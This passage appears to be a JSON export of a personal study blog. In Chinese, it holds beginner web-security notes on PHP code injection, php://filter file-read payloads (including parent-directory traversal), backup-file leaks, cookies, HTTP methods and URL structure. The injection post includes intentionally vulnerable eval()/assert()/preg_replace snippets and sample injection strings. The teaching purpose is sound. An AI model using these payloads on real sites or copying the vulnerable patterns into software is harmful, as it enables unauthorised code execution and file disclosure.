basic","slug":"web-basic","permalink":"https://mengnankk.top/categories/web-basic/"}],"tags":[{"name":"basic","slug":"basic","permalink":"https://mengnankk.top/tags/basic/"}]},{"title":"web day3","slug":"day4","date":"2023-11-19T16:00:00.000Z","updated":"2024-06-06T06:10:32.072Z","comments":true,"path":"2023/11/20/day4/","permalink":"https://mengnankk.top/2023/11/20/day4/","excerpt":"","text":"web基础知识php文件有以下几种备份的格式:.git .svn .swp .bak .bash-history 类如 index.php.git robots协议robots协议规定了哪些东西可以抓取，哪些东西不能够抓取。robots.txt是一个文本文件也是一个协议。其可以在搜索引擎中访问网站中要查看的第一个文件。 cookiecookie是主机访问web服务器由服务器创建的，将信息储存在用户计算机上的文件，一般用户习惯使用cookies cookie的使用： 1..判断用户是否已经登录网站 2.购物车网站用户跳转保存在其中的数据 3.等等等 php对于文件的读取php://filter/read=convert.base64-encode/resource=index.php 组成解析1.php:&#x2F;&#x2F;filter&#x2F;可以作为一个中间流来处理其他流，可以进行任意文件的读取。 2.read&#x3D;convert.base64-encode&#x2F;resource将数据转换为base64编码来读取数据 3.&#x3D;index.php读取的文件 添加：读取上级目录文件 php://filter/read=convert.base64-encode/resource=.../.../a.txt 读取其他的目录文件 php://filter/read=convert.base64-encode/resource=F：\\b.txt","categories":[{"name":"web basic","slug":"web-basic","permalink":"https://mengnankk.top/categories/web-basic/"}],"tags":[{"name":"basic","slug":"basic","permalink":"https://mengnankk.top/tags/basic/"}]},{"title":"php命令注入及其实例","slug":"day5","date":"2023-11-19T16:00:00.000Z","updated":"2024-06-06T06:10:37.908Z","comments":true,"path":"2023/11/20/day5/","permalink":"https://mengnankk.top/2023/11/20/day5/","excerpt":"","text":"php注入概述rce概念：remote command&#x2F;code execute，远程命令&#x2F;代码执行。 php代码执行：在web中，php代码执行是指应用程序过滤不严，用户可通过http请求将代码注入到应用中执行 php代码注入与sql注入比较： 注入的思想类似，均是构造语句绕过服务器的过滤去执行。 区别在于sql注入是将语句注入到数据库中执行，而php代码执行是可以将代码注入到应用中，最终由服务器运行。 php代码注入的条件： 1.程序中含有可以执行php代码的函数或者语言结构 2.传入该函数或者语言结构的参数是可以由客户端控制的（可以直接修改或者造成影响）且应用过滤不严。 危害： 这样的漏洞如果没有特殊的过滤，相当于一个web后门的存在，攻击者可以执行漏洞继承web用户权限，执行任意代码。如果服务器没有正确配置或者web用户权限比较高的话，还可以读写靶机服务器任意文件的内容，甚至控制整个网站或者服务器。 相关的函数或语言结构1.eval()函数作用：该函数的作用是将字符串作为PHP代码执行。 例： &lt;?phpif (isset($_GET[&#x27;code&#x27;]))&#123; $code=$_GET[&#x27;code&#x27;]; eval($code);&#125;else&#123; echo &quot;Please submit code!&lt;br &gt;code=phpinfo();&quot;;&#125; 通过浏览器访问上述函数所在网页时，可以通过传递参数该code来执行PHP探针。主要方式有以下几种：①普通方式提交变量：?code=phpinfo();②以语句块方式提交变量：?code=&#123;phpinfo();&#125;③以多语句方式提交参数：?code=1;phpinfo(); payload:?code&#x3D; 2.assert()函数作用：该函数的作用是将字符串作为PHP代码执行。如果它的条件返回错误，则终止程序执行。 例： &lt;?phpif (isset($_GET[&#x27;code&#x27;]))&#123; $code=$_GET[&#x27;code&#x27;]; assert($code);&#125;else&#123; echo &quot;Please submit code!&lt;br &gt;?code=phpinfo();&quot;;&#125; 普通方式提交变量：?code=phpinfo()或者?code=phpinfo();与eval()函数有别的是，该函数不能执行传入语句块或多语句作为参数。 3.preg_replace()函数作用：该函数用于对字符串进行正则处理。 解析：preg_replace 函数一个参数是一个正则表达式，按照 php的格式，表达式在两个&#x2F;之间，如果在表达式末尾加上一个 e，则第二个参数就会被当做 php代码执行 &lt;?php @preg_replace(&quot;/abcd/e&quot;,$_POST[&#x27;hacker&#x27;],&quot;abcdefg&quot;); ?&gt; 通过浏览器访问上述函数所在网页时，可以通过传递参数该code来执行PHP探针。主要方式有以下几种：①普通方式提交变量：?code&#x3D;[phpinfo();]，[]是由于preg_replace的第一个参数有分号。②以语句块方式提交变量：?code&#x3D;{[phpinfo();]}③以多语句方式提交参数：?code&#x3D;1;[phpinfo();]","categories":[{"name":"web php","slug":"web-php","permalink":"https://mengnankk.top/categories/web-php/"}],"tags":[{"name":"php","slug":"php","permalink":"https://mengnankk.top/tags/php/"}]},{"title":"web day1","slug":"day2","date":"2023-11-15T16:00:00.000Z","updated":"2024-06-06T06:10:21.410Z","comments":true,"path":"2023/11/16/day2/","permalink":"https://mengnankk.top/2023/11/16/day2/","excerpt":"","text":"01.get&amp;&amp;post的区别： 1.传送方式的不同：get通过url进行传参，而post通过dao文传输。 2.传送长度的不同：get因为通过url栏进行传参，所以其长度是有限的，受限于url栏的长度。而post则没有限制。 3.get产生一个tcp数据包，而Post产生两个数据包。 get请求，浏览器会把header和data一起发送出去，服务器响应200 post请求，浏览器会先发送header，然后服务器响应100，之后再发送data，浏览器响应200。 4.get请求是幂等的，即多次请求同一个资源会得到相同的结果，而post请求是非幂等的，即多次请求之后对同一个资源会产生不同的结果。 5.get请求通常用来获取资源，而post请求通常用来提交数据发送表单，进行状态修改等操作。 6.get请求可以缓存，可以被存为书签，可以被浏览器的历史纪录查询，而post请求则都不能。 url/?...=... 02url栏的组成 例子：http://thecat.top:80&#x2F;cat&#x2F;index.phpuserID&#x3D;1&amp;passwordID&#x3D;123456#OK 1.协议部分：该url的协议部分为http:&#x2F;&#x2F; 2.域名部分：该url的域名为thecat.top，也可以用ip作为域名来使用。 3.端口部分：跟在域名后面为端口，端口和域名之间用：作为间隔。端口不是url的必须部分。 4.虚拟目录部分：从域名后第一个&#x2F;开始到最后一个&#x2F;位置为虚拟目录位置，虚拟目录也并不是一个url所必须的部分。 5.文件名部分：从域名后的最后一个&#x2F;开始到？为止，为文件名部分，如果没有？，则是从域名后的最后一个&#x2F;开始到#为止。如果没有？或者#则从域名最后的一个&#x2F;开始到结束都是文件名部分。文件名部分也不是一个url所必须的部分 6.锚部分：从#开始到最后都是锚部分，锚点表示资源中的一种“书签”，给浏览器显示位于该“加书签”位置的内容的方向。锚部分也不是url所必须的部分。 7.参数部分从？开始到#号为止的部分为参数部分，又称搜索部分，查询部分等。参数部分可以存在多个参数，之间用&amp;连接。","categories":[{"name":"web basic","slug":"web-basic","permalink":"https://mengnankk.top/categories/web-basic/"}],"tags":[{"name":"basic","slug":"basic","permalink":"https://mengnankk.top/tags/basic/"}]},{"title":"first php","slug":"day1","date":"2023-11-14T16:00:00.000Z","updated":"2024-06-06T06:10:10.088Z","comments":true,"path":"2023/11/15/day1/","permalink":"https://mengnankk.top/2023/11/15/day1/","excerpt":"","text":"is_string()：检测变量是否是字符串isset()：检测变量是否已设置并且非 NULLin_array(要搜索的值，要搜索的数组)：搜索数组中是否存在指定的值mb_substr($page，n，m)：返回page中从第n位开始，到n+m位字符串的值mb_strpos()：查找字符串在另一个字符串中首次出现的位置urldecode()：将url编码后的字符串还原成未编码的样子","categories":[{"name":"php","slug":"php","permalink":"https://mengnankk.top/categories/php/"}],"tags":[{"name":"school","slug":"school","permalink":"https://mengnankk.top/tags/school/"}]}],"categories":[{"name":"java","slug":"java","permalink":"https://mengnankk.top/categories/java/"},{"name":"bbs","slug":"bbs","permalink":"https://mengnankk.top/categories/bbs/"},{"name":"python","slug":"python","permalink":"https://mengnankk.top/categories/python/"},{"name":"C","slug":"C","permalink":"https://mengnankk.top/categories/C/"},{"name":"c","slug":"c","permalink":"https://mengnankk.top/categories/c/"},{"name":"web dvwa","slug":"web-dvwa","permalink":"https://mengnankk.top/categories/web-dvwa/"},{"name":"web php","slug":"web-php","permalink":"https://mengnankk.top/categories/web-php/"},{"name":"web xss","slug":"web-xss","permalink":"https://mengnankk.top/categories/web-xss/"},{"name":"web basic","slug":"web-basic","permalink":"https://mengnankk.top/categories/web-basic/"},{"name":"php","slug":"php","permalink":"https://mengnankk.top/categories/php/"}],"tags":[{"name":"java","slug":"java","permalink":"https://mengnankk.top/tags/java/"},{"name":"java maven","slug":"java-maven","permalink":"https://mengnankk.top/tags/java-maven/"},{"name":"python","slug":"python","permalink":"https://mengnankk.top/tags/python/"},{"name":"C","slug":"C","permalink":"https://mengnankk.top/tags/C/"},{"name":"c","slug":"c","permalink":"https://mengnankk.top/tags/c/"},{"name":"dvwa","slug":"dvwa","permalink":"https://mengnankk.top/tags/dvwa/"},{"name":"php","slug":"php","permalink":"https://mengnankk.top/tags/php/"},{"name":"host","slug":"host","permalink":"https://mengnankk.top/tags/host/"},{"name":"basic","slug":"basic","permalink":"https://mengnankk.top/tags/basic/"},{"name":"school","slug":"school","permalink":"https://mengnankk.top/tags/school/"}]}